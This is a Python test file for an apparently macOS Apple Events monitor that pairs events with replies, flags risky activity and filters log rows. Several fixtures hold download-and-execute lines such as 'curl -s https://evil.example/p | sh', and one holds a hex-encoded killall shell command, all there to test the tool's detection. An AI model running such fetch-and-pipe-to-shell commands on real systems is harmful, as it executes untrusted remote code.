"""Tests for the app's event model (pairing, indicators, filtering)."""

from aemonitor.app.model import EventStore, RecordPreparer, RowFilter, process_name, reply_summary

EVENT = {
    "eventMessage": "sendToSelf(), event={syso,exec target='psn '[osascript] {----=utxt(32/$6b0069006c006c0061006c006c0020005400650072006d0069006e0061006c00...)} attr:{subj=NULL-impl,comp=8454145,scid=1,csig=65536} returnID=-27082} reply=0xNULL-impl sendMode=1043 timeout=7200",
    "processImagePath": "/usr/bin/osascript",
    "processID": 1819,
    "timestamp": "2026-02-12 23:26:48.566432+0000",
}
REPLY = {
    "eventMessage": "AE2000: (1819) Reply of SendToSelf ( err == 0) reply={aevt,ansr target='psn '[osascript] {----=\"done\"} returnID=-27082}",
    "processImagePath": "/usr/bin/osascript",
    "processID": 1819,
    "timestamp": "2026-02-12 23:26:48.600000+0000",
}
FAILED_REPLY = {
    "eventMessage": "AE2000: (1819) Reply of SendToSelf ( err == -1708) reply={aevt,ansr target='psn '[osascript] {} returnID=-27082}",
    "processImagePath": "/usr/bin/osascript",
    "processID": 1819,
}


def _clone(src):
    return {"eventMessage": f'cloneForCompatability(src="{src}" dst=0x0)', "processImagePath": "/usr/bin/osascript"}


def _ingest(store, *entries):
    prepare = RecordPreparer()
    return [store.add(prepare(dict(e))) for e in entries]


class TestHelpers:
    def test_process_name_prefers_app_bundle(self):
        assert process_name("/Applications/Safari.app/Contents/MacOS/Safari") == "Safari"
        assert process_name("/usr/bin/osascript") == "osascript"
        assert process_name("") == "unknown"

    def test_reply_summary_reports_errn(self):
        text, err = reply_summary({"raw": "{aevt,ansr {errn=-1743} returnID=1}", "applescript": "aevtansr "})
        assert err == "-1743"
        assert text.startswith("error -1743")

    def test_reply_summary_falls_back_to_send_error(self):
        _text, err = reply_summary({"raw": "{}", "applescript": ""}, FAILED_REPLY["eventMessage"])
        assert err == "-1708"


class TestPreparer:
    def test_drops_non_apple_events(self):
        assert RecordPreparer()({"eventMessage": "tryDescCoercion: coerce from shor"}) is None

    def test_drops_short_and_repeated_clones(self):
        prepare = RecordPreparer()
        assert prepare(_clone("short")) is None
        assert prepare(_clone("curl -s https://example.com/payload")) is not None
        assert prepare(_clone("curl -s https://example.com/payload")) is None


GDUT = {
    "eventMessage": "sendToSelf(), event={ascr,gdut target='psn '[osascript] {} returnID=-22857} reply=0xNULL-impl sendMode=1043 timeout=7200",
    "processImagePath": "/usr/bin/osascript",
    "processID": 1819,
}
GDUT_REPLY = {
    "eventMessage": "AE2000: (1819) Reply of SendToSelf ( err == -1708) reply={aevt,ansr target='psn '[osascript] {} returnID=-22857}",
    "processImagePath": "/usr/bin/osascript",
    "processID": 1819,
}


class TestHiddenEvents:
    def test_gdut_and_its_reply_are_dropped(self):
        prepare = RecordPreparer()
        assert prepare(dict(GDUT)) is None
        assert prepare(dict(GDUT_REPLY)) is None

    def test_other_replies_still_pass(self):
        prepare = RecordPreparer()
        assert prepare(dict(GDUT)) is None
        assert prepare(dict(EVENT)) is not None
        assert prepare(dict(REPLY)) is not None


ANSWER_AS_EVENT = {
    "eventMessage": "sendToModernProcess(...) event={aevt,ansr target=osascript {----=utxt(10/$61006200630064006500)} returnID=771}",
    "processImagePath": "/usr/bin/osascript",
    "processID": 1819,
}
GETD_REQUEST = {
    "eventMessage": "event={core,getd target='psn '[Finder] {----={form=prop,want=prop,seld=pnam,from=NULL-impl}} returnID=771}",
    "processImagePath": "/usr/bin/osascript",
    "processID": 1819,
}


class TestCorrelation:
    def test_correlation_key_is_thread_and_return_id(self):
        store = EventStore()
        rec = RecordPreparer()({
            "eventMessage": "event={core,getd target='psn '[Finder] {----={form=prop,want=prop,seld=pnam,from=NULL-impl}} returnID=99}",
            "processImagePath": "/usr/bin/osascript", "processID": 5, "threadID": 777,
        })
        row, _ = store.add(rec)
        assert row.correlation == (777, 99)

    def test_correlation_none_without_thread(self):
        store = EventStore()
        rec = RecordPreparer()({
            "eventMessage": "event={core,getd target='psn '[Finder] {----={form=prop,want=prop,seld=pnam,from=NULL-impl}} returnID=99}",
            "processImagePath": "/usr/bin/osascript", "processID": 5,
        })
        row, _ = store.add(rec)
        assert row.correlation is None


class TestSelfTargetTell:
    SELF = {
        "eventMessage": "finishAndSendReply: 0 event={core,doex target='psn '[System Events] {----={form=indx,want=lwnd,seld=utxt(12/$530061006600610072006900)}} returnID=55} reply={aevt,ansr target='psn '[System Events] {----=true(0/$)} returnID=55}",
        "processImagePath": "/System/Library/CoreServices/System Events.app/Contents/MacOS/System Events",
        "processID": 7,
    }
    CROSS = {
        "eventMessage": "event={core,doex target='psn '[System Events] {----={form=indx,want=lwnd,seld=utxt(12/$530061006600610072006900)}} returnID=55}",
        "processImagePath": "/Applications/Utilities/Script Editor.app/Contents/MacOS/Script Editor",
        "processID": 8,
    }

    def test_self_target_drops_tell(self):
        # The target stays populated (accurate), but the redundant "tell application
        # X" is dropped from the rendered AppleScript.
        rec = RecordPreparer()(dict(self.SELF))
        event = rec["appleEvent"]["event"]
        assert event["target"] == "System Events"
        assert "tell application" not in event["applescript"]

    def test_cross_app_target_kept(self):
        rec = RecordPreparer()(dict(self.CROSS))
        event = rec["appleEvent"]["event"]
        assert event["target"] == "System Events"
        assert 'tell application "System Events"' in event["applescript"]

    # Receiver side (finishAndSendReply): target kept so the decompiler resolves the
    # app's terminology (coredosc -> "do script"), but the redundant tell is dropped.
    RECEIVER_DOSC = {
        "eventMessage": "finishAndSendReply: 0 event={core,dosc target=Script Editor {----=utxt(38/$74006f0075006300680020002f0074006d0070002f0074006500730074002e00...)} attr:{subj=NULL-impl,csig=65536} returnID=2152} reply={aevt,ansr target=Script Editor {----={from={from=NULL-impl,want=cwin,form=ID  ,seld=1030},want=ttab,form=indx,seld=1}} returnID=2152}",
        "processImagePath": "/System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal",
        "processID": 9,
    }

    def test_receiver_resolves_terminology_without_tell(self):
        rec = RecordPreparer()(dict(self.RECEIVER_DOSC))
        event = rec["appleEvent"]["event"]
        assert event["target"] == "Terminal"
        assert event["applescript"].startswith("do script")
        assert "coredosc" not in event["applescript"]
        assert "tell application" not in event["applescript"]


class TestAnswerReclassification:
    def test_event_aevt_ansr_becomes_a_reply(self):
        record = RecordPreparer()(dict(ANSWER_AS_EVENT))
        assert set(record["appleEvent"]) == {"reply"}
        store = EventStore()
        row, is_new = store.add(record)
        assert is_new and row.kind == "reply"
        assert row.reply_text == '"abcde"'
        assert store.counts["code"] == {}  # not counted as a command

    def test_answer_pairs_with_its_pending_request(self):
        prepare = RecordPreparer()
        store = EventStore()
        store.add(prepare(dict(GETD_REQUEST)))
        row, is_new = store.add(prepare(dict(ANSWER_AS_EVENT)))
        assert not is_new  # attached to the request, no extra row
        assert len(store.rows) == 1
        assert row.code == "core,getd" and row.reply_text == '"abcde"'


class TestEventStore:
    def test_reply_attaches_to_request(self):
        store = EventStore()
        (row, new), (same, attached_new) = _ingest(store, EVENT, REPLY)
        assert new and not attached_new
        assert same is row
        assert len(store.rows) == 1
        assert row.code == "syso,exec"
        assert row.reply_text == "done"
        assert [f.id for f in row.flags] == ["shell"]

    def test_unmatched_reply_gets_its_own_row(self):
        store = EventStore()
        _ingest(store, REPLY)
        assert [r.kind for r in store.rows] == ["reply"]

    def test_counts_follow_reply_attachment(self):
        store = EventStore()
        _ingest(store, EVENT, FAILED_REPLY)
        row = store.rows[0]
        assert row.reply_error == "-1708"
        assert store.counts["code"]["syso,exec"] == 1
        assert store.counts["indicator"]["shell"] == 1

    def test_clone_with_download_is_flagged_high(self):
        store = EventStore()
        _ingest(store, _clone("curl -s https://example.com/payload | sh"))
        assert store.rows[0].kind == "clone"
        assert store.rows[0].severity == "high"


class TestRowFilter:
    def _row(self):
        store = EventStore()
        _ingest(store, EVENT)
        return store.rows[0]

    def test_query_terms(self):
        row = self._row()
        assert RowFilter("code:syso").matches(row)
        assert RowFilter("pid:1819 killall").matches(row)
        assert not RowFilter("proc:Finder").matches(row)
        assert RowFilter("flag:medium").matches(row)
        assert not RowFilter("flag:high").matches(row)

    def test_include_and_mute(self):
        row = self._row()
        f = RowFilter()
        f.include["process"] = {"Safari"}
        assert not f.matches(row)
        f.include["process"] = {"osascript"}
        assert f.matches(row)
        f.muted.add(("code", "syso,exec"))
        assert not f.matches(row)

    def test_only_flagged_and_clones(self):
        store = EventStore()
        _ingest(store, _clone("echo something harmless here"))
        clone = store.rows[0]
        assert not RowFilter(show_clones=False).matches(clone)
        assert not RowFilter(only_flagged=True).matches(clone)

    def test_privacy_modes(self):
        # One record per redaction class, with the real AE formatStrings.
        public_event = {
            **EVENT,
            "formatString": "%{public}ssendToSelf(), event=%{public}s reply=0x%{public}s sendMode=%x timeout=%ld",
        }
        default_event = {
            "eventMessage": "OSStatus sendToModernProcess(mach_port_t, UInt32, const AppleEvent *, UInt32, AESendMode)(port=(port:172547/0x2a203 send:2 limit:0) msgID=0 timeout 7199 event={core,getd target='psn '[System Events] {----={form=indx,want=cdis,seld=abso(4/$206c6c61),from=NULL-impl}} attr:{csig=65536} returnID=196}",
            "formatString": "%{public}s%{public}s(port=%{public}s msgID=%d timeout %d event=%s",
            "processImagePath": "/System/Applications/Utilities/Script Editor.app/Contents/MacOS/Script Editor",
            "processID": 459,
        }
        private_clone = {
            "eventMessage": 'cloneForCompatability(src="curl -s https://evil.example/p | sh" dst=0x0)',
            "formatString": "%{public}scloneForCompatability(src=%{private}s dst=%p",
            "processImagePath": "/usr/bin/osascript",
        }
        store = EventStore()
        rows = [row for row, _ in _ingest(store, public_event, default_event, private_clone)]
        assert [r.privacy for r in rows] == ["public", "default", "private"]

        def shown(mode):
            return [r.privacy for r in rows if RowFilter(privacy_mode=mode).matches(r)]

        assert shown("private") == ["public", "default", "private"]  # Enable-Private-Data
        assert shown("public") == ["public", "default"]  # Default-Privacy-Setting: Public
        assert shown("default") == ["public"]  # stock macOS

    def test_rows_without_format_string_always_shown(self):
        store = EventStore()
        row, _ = _ingest(store, EVENT)[0]
        assert row.privacy is None
        assert RowFilter(privacy_mode="default").matches(row)


class TestAppleScriptTokens:
    def _kinds(self, text):
        from aemonitor.app.model import applescript_tokens

        return [(text[s:e], kind) for s, e, kind in applescript_tokens(text)]

    def test_command_string_and_keyword(self):
        assert self._kinds('tell application "Finder" to do shell script "id"') == [
            ("tell", "keyword"),
            ("application", "keyword"),
            ('"Finder"', "string"),
            ("to", "keyword"),
            ("do shell script", "command"),
            ('"id"', "string"),
        ]

    def test_keywords_inside_strings_are_not_highlighted(self):
        assert self._kinds('"tell me to set"') == [('"tell me to set"', "string")]

    def test_record_labels_and_numbers(self):
        assert self._kinds("{errn: 1, ttxt: \"\"}") == [
            ("errn", "label"),
            ("1", "number"),
            ("ttxt", "label"),
            ('""', "string"),
        ]

    def test_unknown_codes_stay_plain(self):
        assert self._kinds("ascrgdut ") == []
